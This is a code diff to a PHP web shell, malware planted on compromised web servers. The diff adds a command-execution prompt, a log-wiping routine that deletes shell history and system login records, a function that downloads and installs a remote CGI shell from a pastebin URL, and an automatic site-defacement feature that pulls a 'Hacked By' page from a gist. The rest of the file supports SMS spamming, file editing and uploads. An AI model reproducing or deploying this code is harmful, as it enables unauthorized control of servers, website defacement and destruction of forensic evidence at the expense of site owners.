@@ -23,6 +23,17 @@
 session_start();
 set_time_limit(0);
 ini_set('max_execution_time', 0);
+ini_set('memory_limit', '999999999M');
+ini_restore('safe_mode');
+
+if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
+		$sep = substr('\\', 0, 1);
+		$os = "Windows";
+	} else {
+		$sep = '/';
+		$os = "Linux";
+}
+
 $auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; // sha1('tuzki')
 if (! empty($_SERVER['HTTP_USER_AGENT'])) {
 	$userAgents = array(
@@ -212,7 +223,7 @@ function spamsms()
 	?>
 <center>
 		<h2>Spam SMS</h2>
-		<form method="post" action="">
+		<form method="post">
 			<textarea name="no" class="form-control" id="textarea"
 				placeholder='No HP ex : 888218005037 ' required cols="" rows=""></textarea>
 			<br> <input type="submit" name="action" class="btn btn-danger" />
@@ -252,17 +263,17 @@ function music()
 
 function jumping()
 {
-	alert("Kalem euy");
+	alert("This feature under developmen");
 }
 
 function config()
 {
-	alert("Kalem euy");
+	alert("This feature under developmen");
 }
 
 function mass_deface()
 {
-	alert("Kalem euy");
+	alert("This feature under developmen");
 }
 
 function info()
@@ -550,7 +561,7 @@ function edit($filename)
 	}
 	$text = file_get_contents($filename);
 	?>
-<form action="" method="post">
+<form method="post">
 		<center>
 			<h5>Files Editor : <?php echo $filename;?></h5>
 			<textarea name="text" class="form-control" id="textarea" cols=""
@@ -595,6 +606,24 @@ function cmd($cmd)
 	}
 }
 
+function cmd_ui()
+{
+	echo "<center><h2>Command Prompt</h2></center>";
+	if (isset($_POST['command'])) {
+		echo "<center><textarea id='textarea' class='form-control' readonly>" . cmd($_POST['command']) . "</textarea></center>";
+	}
+	?>
+<center>
+		<form method="post">
+			<input type="text" class='input-sm' id='input' name="command" /> <input
+				type="submit" class="btn btn-danger" />
+		</form>
+	</center>
+	<form></form>
+<?php
+	die();
+}
+
 function renames($filename)
 {
 	if (isset($_POST['action'])) {
@@ -606,10 +635,10 @@ function renames($filename)
 		home();
 	}
 	?>
-   <form method='post' action="">
+   <form method='post'>
 		<center>
 			<td>Filename : <input type='text' class='input-sm' id='input'
-				value='&lt;?php echo $filename; ?&gt;' name='newname'></td> <input
+				value='<?php echo $filename; ?>' name='newname'></td> <input
 				type='submit' class='btn btn-danger' name='action' value='rename'>
 		</center>
 	</form>
@@ -621,14 +650,14 @@ function chmods($filename)
 {
 	if (isset($_POST['action'])) {
 		if (chmod($filename, $_POST['permission'])) {
-			alert("Success");
+ 		alert("Success");
 		} else {
 			alert("Permission Denied");
 		}
 		home();
 	}
 	?>
-   <form method='post' action="">
+   <form method='post'>
 		<center>
 			<td>Permission : <input type='text' class='input-sm' id='input'
 				value='0755' name='permission'></td> <input type='submit'
@@ -638,6 +667,114 @@ function chmods($filename)
 	<?php
 	die();
 }
+
+function clear_logs()
+{
+	global $os;
+	if($os == 'Linux') {
+		@unlink('/tmp/logs');
+		@unlink('/root/.ksh_history');
+		@unlink('/root/.bash_history');
+		@unlink('/root/.bash_logout');
+		@unlink('/usr/local/apache/logs');
+		@unlink('/usr/local/apache/log');
+		@unlink('/var/apache/logs');
+		@unlink('/var/apache/log');
+		@unlink('/var/run/utmp');
+		@unlink('/var/logs');
+		@unlink('/var/log');
+		@unlink('/var/adm');
+		@unlink('/etc/wtmp');
+		@unlink('/etc/utmp');
+		@unlink('/var/log/lastlog');
+		@unlink('/var/log/wtmp');
+		@unlink('.config');
+		@unlink('error_log');
+		alert("Logs is clear");
+	} else {
+		alert("This function not available for Windows server");
+		@unlink('.config');
+	}
+}
+
+function cgi_shell()
+{
+	global $os;
+	if($os == 'Windows') {
+		alert("This function not available for Windows server");
+	} else {
+	if(!file_exists('.config')) {
+		mkdir('.config');
+	}
+	$isi  = "AddHandler cgi-script .izo
+	Options -Indexes";
+	file_put_contents('.config/.htaccess', $isi);
+	file_put_contents('.config/cgi.izo', file_get_contents('https://pastebin.com/raw/MUD0EPjb'));
+	echo("<iframe src='.config/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>");
+	die();
+	}
+	
+}
+
+function ngindex()
+{
+	if (isset($_POST['action'])) {
+		$file=file_get_contents('https://gist.githubusercontent.com/Cvar1984/3bfdd8d2c09f8889440a9f74f6114a04/raw/899508d80ec7eba573bfb91af082586e26bf71e4/index.php');
+		$file=str_replace('<title>Hacked By Cvar1984</title>', '<title>'.$_POST['title'].'</title>',$file);
+		$file=str_replace('https://cvar1984.github.io/bg.mp3', $_POST['music'],$file);
+		$file=str_replace('Just Joke :v', $_POST['alert'],$file);
+		$file=str_replace('https://minervagunceleri.files.wordpress.com/2014/08/logo.png', $_POST['images'],$file);
+		$file=str_replace('<h1>Hacked By Cvar1984</h1>', '<h1>'.$_POST['content'].'</h1>',$file);
+		$file=str_replace('<h4>This Pain Is Wonderful</h4>', '<h4>'.$_POST['sub_content'].'</h4>',$file);
+
+		if(file_exists('index.php')) {
+			rename('index.php', 'index.php.bak');
+			chmod('index.php.bak', '0444');
+			if(file_put_contents('index.php', $file)) {
+				alert("index.php Defaced");
+			}
+		} elseif(file_exists('index.html')) {
+			rename('index.html', 'index.html.bak');
+			chmod('index.html.bak', '0444');
+			if(file_put_contents('index.html', $file)) {
+				alert("index.html Defaced");
+			}
+		}
+	}
+	?>
+<center><h2>Auto Deface With Backup</h2></center>
+<form method='post'>
+	<table align="center">
+		<tr>
+			<td>Title</td> <td>:</td>
+			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='title'></td>
+			</tr>
+		<tr>
+			<td>Alert Message</td> <td>:</td> 
+			<td><input type='text' class='input-sm' id='input' value='Just Joke :v' name='alert'></td>
+			</tr>
+		<tr>
+			<td>Music Link</td> <td>:</td> 
+			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/bg.mp3' name='music'></td>
+			</tr>
+		<tr>
+			<td>Image Link</td> <td>:</td> 
+			<td><input type='text' class='input-sm' id='input' value='https://minervagunceleri.files.wordpress.com/2014/08/logo.png' name='images'></td>
+		<tr>
+			<td>Content</td> <td>:</td>
+			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='content'></td>
+		<tr>
+			<td>Sub Content</td> <td>:</td>
+			<td><input type='text' class='input-sm' id='input' value='This Pain Is Wonderful' name='sub_content'></td>
+	    </table>
+	    <center>
+	    	<br /><input type='submit' class='btn btn-danger' name='action' value='Deface'>
+	    </center>
+</form>
+	<?php
+	die();
+}
+
 // END FUNCTION
 ?>
  <nav class="navbar navbar-inverse">
@@ -658,6 +795,9 @@ function chmods($filename)
 						<li><a href='?do=config'>Config</a></li>
 						<li><a href='?do=mass_deface'>Mass Deface</a></li>
 						<li><a href='?do=info'>Server Info</a></li>
+						<li><a href='?do=logs'>Clear Logs</a></li>
+						<li><a href='?do=cgi'>CGI Shell</a></li>
+						<li><a href='?do=deface'>Auto Deface</a></li>
 					</ul></li>
 				<li><a href='?do=logout'><span class="glyphicon glyphicon-log-in"></span>
 						Logout</a></li>
@@ -699,20 +839,13 @@ if (@$_GET['do'] == 'home') {
 } elseif (@$_GET['do'] == 'chmod' and isset($_GET['files'])) {
 	chmods($_GET['files']);
 } elseif (@$_GET['do'] == 'cmd') {
-	echo "<center><h3>Command Prompt</h3></center>";
-	if (isset($_POST['command'])) {
-		echo "<center><textarea id='textarea' class='form-control' readonly>" . cmd($_POST['command']) . "</textarea></center>";
-	}
-	?>
-<center>
-		<form method="post" action="">
-			<input type="text" class='input-sm' id='input' name="command" /> <input
-				type="submit" class="btn btn-danger" />
-		</form>
-	</center>
-	<form action=""></form>
-<?php
-	die();
+	cmd_ui();
+} elseif(@$_GET['do'] == 'logs') {
+	clear_logs();
+} elseif(@$_GET['do'] == 'cgi') {
+	cgi_shell();
+} elseif(@$_GET['do'] == 'deface') {
+	ngindex();
 }
 
 $dir = scandir(getcwd());
@@ -724,12 +857,7 @@ foreach ($dir as $dir) :
 	?>
 <table width='70%' class='table-hover' align='center'>
 		<tr>
-		<?php
-	if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
-		$sep = substr('\\', 0, 1);
-	} else {
-		$sep = '/';
-	}
+	<?php
 	$ext = pathinfo($dir, PATHINFO_EXTENSION);
 	if (is_dir($dir)) {
 		echo "
@@ -780,7 +908,7 @@ if (isset($_POST['upl'])) {
 	}
 }
 ?>
-   <form method="post" enctype="multipart/form-data" action="">
+   <form method="post" enctype="multipart/form-data">
 		<center>
 			<input class="btn" id="input" type="file" name="file" /> <input
 				class="btn btn-danger" name="upl" type="submit" value="Save">
